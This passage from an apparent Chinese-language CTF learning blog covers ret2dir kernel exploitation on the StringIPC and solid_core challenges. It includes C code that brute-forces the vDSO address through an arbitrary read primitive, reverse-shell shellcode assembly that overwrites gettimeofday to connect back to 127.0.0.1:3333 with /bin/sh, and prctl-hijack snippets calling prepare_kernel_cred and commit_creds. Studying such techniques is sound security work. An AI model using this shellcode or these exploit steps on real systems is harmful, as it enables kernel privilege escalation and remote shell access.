class="line">7ffff7ffd000-7ffff7ffe000 rw-p 00023000 08:01 3276897                    /lib/x86_64-linux-gnu/ld-2.19.so</span><br><span class="line">7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]</span><br><span class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</span><br></pre></td></tr></table></figure></p>
<p>使用两个页框存储，将vdso dump下来查看文件格式及其格式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~/kernel/pwn/ret2dir/stringipc$ dd if=/proc/self/mem of=vdso.so bs=4096 skip=$[0x7ffff7ffa] count=2</span><br><span class="line">dd: ‘/proc/self/mem’: cannot skip to specified offset</span><br><span class="line">2+0 records in</span><br><span class="line">2+0 records out</span><br><span class="line">8192 bytes (8.2 kB) copied, 0.000358512 s, 22.9 MB/s</span><br><span class="line"></span><br><span class="line">ubuntu@ubuntu:~/kernel/pwn/ret2dir/stringipc$ file vdso.so</span><br><span class="line">vdso.so: ELF 64-bit LSB  shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=01005e92ea3c0c1527396b65c7412468298d0813, stripped</span><br></pre></td></tr></table></figure></p>
<p>这里系统内核版本是3.19.0-25-generic：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~/kernel/pwn/ret2dir/stringipc$ cat /proc/version</span><br><span class="line">Linux version 3.19.0-25-generic (buildd@lgw01-20) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015</span><br></pre></td></tr></table></figure></p>
<p>在IDA里可以看到它主要对外提供了4个函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">clock_gettime	0000000000000A20	</span><br><span class="line">gettimeofday	0000000000000D30	</span><br><span class="line">getcpu	        0000000000000F10	</span><br><span class="line">time	        0000000000000EF0</span><br></pre></td></tr></table></figure></p>
<p>可以利用如下方式获取当前进程映射的vdso的起始地址：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt;</span></span></span><br><span class="line"><span class="keyword">void</span> *vdso = (<span class="keyword">uintptr_t</span>) getauxval(AT_SYSINFO_EHDR);</span><br></pre></td></tr></table></figure></p>
<p>类似于vdso，还存在一块共享内存是vsyscall。vdso提供了与vsyscall相同的功能，并解决了vsyscall的局限性。</p>
<h3 id="爆破vdso地址"><a href="#爆破vdso地址" class="headerlink" title="爆破vdso地址"></a>爆破vdso地址</h3><p>在有了内存的任意读写权限后，利用内核与用户程序拥有的这块共享内存，将vdso中的gettimeofday函数覆写为自己的shellocde。首先要找到内核中vdso的起始地址，因为每个内核版本偏移都不同，首先它一定是页对齐的，然后它拥有ELF文件的格式，有魔数”.ELF”，另外可以通过寻找特殊的字符串，比如”__vdso_gettimeofday”来确定:<br><img src="/2019/10/10/ret2dir利用学习/1.png" alt="1"><br>但这样还是找到了三个偏移,而且找到的vdso的起始地址都有魔数”.ELF”，输出的偏移是字符串在vdso中的偏移:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/ $ ./exp_vdso</span><br><span class="line">[+]ALloc channel id: 1</span><br><span class="line">[+]shrink channel buf_size to -1</span><br><span class="line">gettimeofday offset in vdso: 0x2c6</span><br><span class="line">find in 0xffffffff81e04000</span><br><span class="line"></span><br><span class="line">gettimeofday offset in vdso: 0x19e</span><br><span class="line">find in 0xffffffff81e06000</span><br><span class="line"></span><br><span class="line">gettimeofday offset in vdso: 0x1e8</span><br><span class="line">find in 0xffffffff81e07000</span><br></pre></td></tr></table></figure></p>
<p>对于查找gettimeofday函数的偏移，可以参考从主机里dump下的vdso.so，在IDA里可以看到，这个函数里面有一个特殊的字符串：<br><img src="/2019/10/10/ret2dir利用学习/2.png" alt="2"><br>通过addr的地址可以确定vdso的地址，可以利用内存任意读权限去查找这个字符串“20C49BA5E353F7CFh”的偏移，这个二进制字符串差不多距离函数偏移为0xd0，然后在gdb里往前找一找，找函数开头“push rbp”的位置，从而确定gettimeofday函数的偏移，然后进行shellcode的覆写。在查找之前，同样追溯vdso这块内存的创建方式来进一步缩小范围。可以大致确定范围是0xffff880000000000~0xffffffffff5fffff，而且vdso距离内核基址并不是很远，所以可以很快爆破到。</p>
<p>爆破vdso地址部分代码如下所示：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">char</span> target[<span class="number">20</span>] = <span class="string">"__vdso_gettimeofday"</span>;</span><br><span class="line"><span class="keyword">char</span> funcstr[<span class="number">10</span>] = <span class="string">"\xcf\xf7\x53\xe3\xa5\x9b\xc4\x20"</span>;</span><br><span class="line"><span class="keyword">for</span>(;addr&lt;<span class="number">0xffffffffff5fffff</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">    seek_channel.id = id;</span><br><span class="line">    seek_channel.index = addr - <span class="number">0x10</span>;</span><br><span class="line">    seek_channel.whence = SEEK_SET;</span><br><span class="line">    ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel);</span><br><span class="line"></span><br><span class="line">    read_channel.id = id;</span><br><span class="line">    read_channel.buf = buf;</span><br><span class="line">    read_channel.count = <span class="number">0x1000</span>;</span><br><span class="line">    ioctl(fd,CSAW_READ_CHANNEL,&amp;read_channel);</span><br><span class="line"></span><br><span class="line">    gettime_result = memmem(buf,<span class="number">0x1000</span>,target,<span class="built_in">strlen</span>(target));</span><br><span class="line">    func_result = memmem(buf,<span class="number">0x1000</span>,funcstr,<span class="built_in">strlen</span>(funcstr));</span><br><span class="line">    <span class="keyword">if</span>(gettime_result &amp;&amp; func_result)&#123;</span><br><span class="line">        <span class="comment">//size_t vdso_addr = getauxval(AT_SYSINFO_EHDR);</span></span><br><span class="line">        <span class="keyword">size_t</span> function_offset = func_result - (<span class="keyword">int</span>)(buf);</span><br><span class="line">        gettime_offset = gettime_result - (<span class="keyword">int</span>)(buf);</span><br><span class="line">        <span class="comment">//printf("vdso addr: 0x%lx\n",vdso_addr);</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"__vdso_gettimeofday offset in vdso: 0x%lx\n"</span>,gettime_offset);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"gettimeofday function in 0x%lx\n"</span>,function_offset);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"find in 0x%lx\n"</span>,addr);</span><br><span class="line">        getchar();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>最后执行结果找到了两个偏移，在gdb里往前找”push rbp”可以发现第二个偏移是opcode_map_0f_38这个函数，从而确定第一个偏移是我们需要的地址。其中gettimeofday这个函数的偏移是0xc80。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/ $ ./exp_vdso</span><br><span class="line">[+]ALloc channel id: 1</span><br><span class="line">[+]shrink channel buf_size to -1</span><br><span class="line">__vdso_gettimeofday offset in vdso: 0x2c6</span><br><span class="line">gettimeofday function in 0xd3b</span><br><span class="line">find in 0xffffffff81e04000</span><br><span class="line"></span><br><span class="line">__vdso_gettimeofday offset in vdso: 0x19e</span><br><span class="line">gettimeofday function in 0xa4b</span><br><span class="line">find in 0xffffffff81e06000</span><br></pre></td></tr></table></figure></p>
<h3 id="shellcode组成"><a href="#shellcode组成" class="headerlink" title="shellcode组成"></a>shellcode组成</h3><p>上一步找到了gettimeofday函数的地址，需要将内核中这个函数的位置覆写为shellcode。利用思路是当其他进程调用gettimeofday函数时执行我们的shellcode。这里shellcode采取了一定的优化，我参考了这篇<a href="https://hardenedlinux.github.io/translation/2015/11/25/Translation-Bypassing-SMEP-Using-vDSO-Overwrites.html" target="_blank" rel="noopener">博客</a>。思想是覆写后，每一个进程只要调用gettimeofday函数就会调用我们的shellcode，但其实我们只需要具有root权限的进程。在shellcode中首先调用系统调用sys_getuid(0x66)判断进程权限，对于那些uid不为0的进程，接着调用sys_gettimeofday(0x60)执行正常的gettimeofday函数功能；对于那些uid=0的进程，调用0x39系统调用fork一个子进程去反弹shell，父进程继续执行sys_gettimeofday(0x60)。反弹的shell连接到127.0.0.1:3333并执行”/bin/sh”。shellcode在<a href="https://gist.github.com/itsZN/1ab36391d1849f15b785" target="_blank" rel="noopener">这里</a>可以找到，我这里先写成了汇编，然后转成十六进制，以加深理解。64位的系统调用可以参考<a href="https://syscalls64.paolostivanin.com/" target="_blank" rel="noopener">这里</a>。关于反弹shell我之前我写过一篇，是pwnable.tw的<a href="https://x3h1n.github.io/2019/04/14/pwnable-tw-kidding/">kidding</a>。<br>但有一个问题我没弄明白127.0.0.1:3333和execve(“/bin/sh”)的参数是如何传参的。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment">##getuid()</span></span><br><span class="line">code = <span class="string">""" </span></span><br><span class="line"><span class="string">        nop</span></span><br><span class="line"><span class="string">        xor rax,rax</span></span><br><span class="line"><span class="string">        mov al,0x66</span></span><br><span class="line"><span class="string">        syscall  #getuid()</span></span><br><span class="line"><span class="string">        xor rbx,rbx</span></span><br><span class="line"><span class="string">        cmp rbx,rax</span></span><br><span class="line"><span class="string">        jne emulate</span></span><br><span class="line"><span class="string">       """</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##fork()</span></span><br><span class="line">code += <span class="string">"""</span></span><br><span class="line"><span class="string">        xor rax,rax</span></span><br><span class="line"><span class="string">        mov al,0x39</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        xor rbx,rbx</span></span><br><span class="line"><span class="string">        cmp rax,rbx</span></span><br><span class="line"><span class="string">        je connect</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##gettimeofday() and retn</span></span><br><span class="line">code += <span class="string">"""</span></span><br><span class="line"><span class="string">        emulate:</span></span><br><span class="line"><span class="string">        xor rax,rax</span></span><br><span class="line"><span class="string">        mov al,0x60</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        retq</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line"><span class="comment">##socket(2,1,0)</span></span><br><span class="line">code += <span class="string">"""</span></span><br><span class="line"><span class="string">        connect:</span></span><br><span class="line"><span class="string">        xor rdx,rdx</span></span><br><span class="line"><span class="string">        pushq 0x1</span></span><br><span class="line"><span class="string">        pop rsi</span></span><br><span class="line"><span class="string">        push 0x2</span></span><br><span class="line"><span class="string">        pop rdi</span></span><br><span class="line"><span class="string">        xor rax,rax</span></span><br><span class="line"><span class="string">        mov al,0x29</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">       """</span></span><br><span class="line"><span class="comment">##connect(fd,ip,0x10)</span></span><br><span class="line">code += <span class="string">"""</span></span><br><span class="line"><span class="string">        xchg rdi,rax</span></span><br><span class="line"><span class="string">        mov rcx,0xfeffff80faf2fffd</span></span><br><span class="line"><span class="string">        not rcx</span></span><br><span class="line"><span class="string">        push rcx</span></span><br><span class="line"><span class="string">        mov rsi,rsp</span></span><br><span class="line"><span class="string">        pushq 0x10</span></span><br><span class="line"><span class="string">        pop rdx</span></span><br><span class="line"><span class="string">        xor rax,rax</span></span><br><span class="line"><span class="string">        mov al,0x2a</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">       """</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##try dup2(oldfd,2),dup2(oldfd,1),dup2(oldfd,0)</span></span><br><span class="line"></span><br><span class="line">code += <span class="string">"""</span></span><br><span class="line"><span class="string">        xor rbx,rbx</span></span><br><span class="line"><span class="string">        cmp rbx,rax</span></span><br><span class="line"><span class="string">        je sh</span></span><br><span class="line"><span class="string">        xor rax,rax</span></span><br><span class="line"><span class="string">        mov al,0xe7</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        sh:</span></span><br><span class="line"><span class="string">        pushq 0x3</span></span><br><span class="line"><span class="string">        pop rsi</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        duploop:</span></span><br><span class="line"><span class="string">        pushq 0x21</span></span><br><span class="line"><span class="string">        pop rax</span></span><br><span class="line"><span class="string">        dec rsi</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        jne duploop</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line"><span class="comment">##execve()</span></span><br><span class="line"><span class="comment">##exit()</span></span><br><span class="line">code += <span class="string">"""</span></span><br><span class="line"><span class="string">        mov rbx,0xff978cd091969dd0</span></span><br><span class="line"><span class="string">        not rbx</span></span><br><span class="line"><span class="string">        push rbx</span></span><br><span class="line"><span class="string">        mov rdi,rsp</span></span><br><span class="line"><span class="string">        push rdi</span></span><br><span class="line"><span class="string">        mov rsi,rsp</span></span><br><span class="line"><span class="string">        xor rdx,rdx</span></span><br><span class="line"><span class="string">        xor rax,rax</span></span><br><span class="line"><span class="string">        mov al,0x3b</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        xor rax,rax</span></span><br><span class="line"><span class="string">        mov al,0xe7</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(code,arch=<span class="string">"amd64"</span>)</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(shellcode)):</span><br><span class="line">   str1 += <span class="string">"\\x"</span> + binascii.b2a_hex(shellcode[i])</span><br><span class="line"><span class="keyword">print</span> str1</span><br></pre></td></tr></table></figure></p>
<h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>总结一下利用思路：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. shrink size获得内存任意读写权限。</span><br><span class="line">2. 利用特殊字符串爆破vdso的地址。</span><br><span class="line">3. 将vdso的中gettimeofday函数覆写为shellcode。</span><br><span class="line">4. 判断shell code是否覆写成功，若成功，则fork一个子进程，并监听127.0.0.1:3333端口，等待shell的回连。</span><br><span class="line">5. 发生gettimeofday函数调用，shellcode执行反弹shell，提权成功。</span><br></pre></td></tr></table></figure></p>
<p>这里测试环境使用了p4nda大佬的方法，在init中加载一个循环执行gettimeofday函数并具有root权限的程序。<br>exp我就不贴了，仅仅记录我在学习过程中遇到的问题。</p>
<h1 id="强网杯-2018-solid-core"><a href="#强网杯-2018-solid-core" class="headerlink" title="强网杯 2018 solid_core"></a>强网杯 2018 solid_core</h1><p>在stringipc kremalloc漏洞的内存任意读写基础上，solid_core限制了写入的范围大于0xffffffff80000000，因为上文中提到cred结构体在动态分配区域，所以这种限制使得修改cred结构体的方法失效。另外题目编译了最新内核使得VDSO不能修改。所以上文中的两种方法就都失效了。从IDA里看simp1e.ko如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x77617369</span>:  <span class="comment">//CSAW_WRITE_CHANNEL</span></span><br><span class="line">  <span class="keyword">if</span> ( copy_from_user(&amp;v25, a3, <span class="number">24L</span>L) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22L</span>L;</span><br><span class="line">  v5 = (<span class="keyword">signed</span> __int64)(v3 + <span class="number">1</span>);</span><br><span class="line">  mutex_lock(v3 + <span class="number">1</span>);</span><br><span class="line">  v16 = *v3;</span><br><span class="line">  v7 = v27;</span><br><span class="line">  <span class="keyword">if</span> ( !*v3 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_39;</span><br><span class="line">  v17 = *((_QWORD *)v16 + <span class="number">3</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)(v17 + v27) &gt; *((_QWORD *)v16 + <span class="number">2</span>) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">  v18 = *((_QWORD *)v16 + <span class="number">1</span>) + v17;</span><br><span class="line">  <span class="keyword">if</span> ( v18 &lt;= <span class="number">0xFFFFFFFF7FFFFFFF</span>LL )  <span class="comment">//这里做出了限制</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_779, v26);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( strncpy_from_user(v18, v26, v27) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_25;</span><br></pre></td></tr></table></figure></p>
<p>出题人给了一个<a href="https://bbs.pediy.com/thread-225488.htm" target="_blank" rel="noopener">新的思路</a>，这个思路来源于INetCop Security分享的New Reliable Android Kernel Root Exploitation Techniques，slide在<a href="http://powerofcommunity.net/poc2016/x82.pdf" target="_blank" rel="noopener">这里</a>可以找到，这种利用方式劫持了prctl函数，可以绕过PXN防御。</p>
<h2 id="prctl"><a href="#prctl" class="headerlink" title="prctl"></a>prctl</h2><p>prctl函数有五个参数，内核对应的处理函数如下，可以看到，内核将prctl的5个参数全部传递给了security_task_prctl函数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.15.8/source/kernel/sys.c#L2200</span></span><br><span class="line">SYSCALL_DEFINE5(prctl, <span class="keyword">int</span>, option, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg3, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg5)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">me</span> = <span class="title">current</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> comm[<span class="keyword">sizeof</span>(me-&gt;comm)];</span><br><span class="line">	<span class="keyword">long</span> error;</span><br><span class="line"></span><br><span class="line">	error = security_task_prctl(option, arg2, arg3, arg4, arg5);</span><br><span class="line">	<span class="keyword">if</span> (error != -ENOSYS)</span><br><span class="line">		<span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">	error = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">switch</span> (option) &#123;</span><br><span class="line">	<span class="keyword">case</span> PR_SET_PDEATHSIG:</span><br><span class="line">		<span class="keyword">if</span> (!valid_signal(arg2)) &#123;</span><br><span class="line">			error = -EINVAL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		me-&gt;pdeath_signal = arg2;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		error = -EINVAL;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在security_task_prctl函数中，传递的参数由hp-&gt;hook.task_prctl调用，hp.hook是一个维护了一个函数虚表，最终调用到虚表里的task_prctl函数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.15.8/source/security/security.c#L1122</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_task_prctl</span><span class="params">(<span class="keyword">int</span> option, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg3, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> thisrc;</span><br><span class="line">	<span class="keyword">int</span> rc = -ENOSYS;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">security_hook_list</span> *<span class="title">hp</span>;</span></span><br><span class="line"></span><br><span class="line">	list_for_each_entry(hp, &amp;security_hook_heads.task_prctl, <span class="built_in">list</span>) &#123;</span><br><span class="line">		thisrc = hp-&gt;hook.task_prctl(option, arg2, arg3, arg4, arg5);</span><br><span class="line">		<span class="keyword">if</span> (thisrc != -ENOSYS) &#123;</span><br><span class="line">			rc = thisrc;</span><br><span class="line">			<span class="keyword">if</span> (thisrc != <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.15.8/source/include/linux/lsm_hooks.h#L1964</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">security_hook_list</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>		<span class="title">list</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>		*<span class="title">head</span>;</span></span><br><span class="line">	<span class="keyword">union</span> security_list_options	hook;</span><br><span class="line">	<span class="keyword">char</span>				*lsm;</span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.15.8/source/include/linux/lsm_hooks.h#L1568</span></span><br><span class="line"><span class="keyword">int</span> (*task_prctl)(<span class="keyword">int</span> option, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg3, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg5);</span><br></pre></td></tr></table></figure></p>
<p>在INetCop Security分享的方法中，第一种思路是关闭SEAndroid之后，将task_prctl函数修改为我们想要调用的内核函数，比如将task_prctl函数修改为prepare_kernel_cred函数，然后传递一个参数0，或者将task_prctl函数修改为commit_creds，然后传递cred_addr，执行commit_creds(cred_addr)。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// change task_prctl within selinux_ops to address of reset_security_ops</span></span><br><span class="line">syscall(<span class="number">172</span>); <span class="comment">/* 172 = sys_prctl */</span><span class="comment">/* reset_security_ops() call */</span></span><br><span class="line">[...]</span><br><span class="line"><span class="comment">// change task_prctl within selinux_ops to address of prepare_kernel_cred </span> </span><br><span class="line">cred_addr=syscall(<span class="number">172</span>, <span class="number">0</span>); <span class="comment">/* prepare_kernel_cred(0) call */</span></span><br><span class="line">[...]</span><br><span class="line"><span class="comment">// change task_prctl within selinux_ops to address of commit_creds</span></span><br><span class="line">syscall(<span class="number">172</span>,cred_addr); <span class="comment">/* commit_creds(cred_addr) call */</span></span><br></pre></td></tr></table></figure></p>
<p>正如参考中的文章里提到的那样，这个方法在64位下不能实现，因为这个函数的第一个参数是int类型，在64位下会被截断，而我们传递的内核函数地址都是64位。</p>
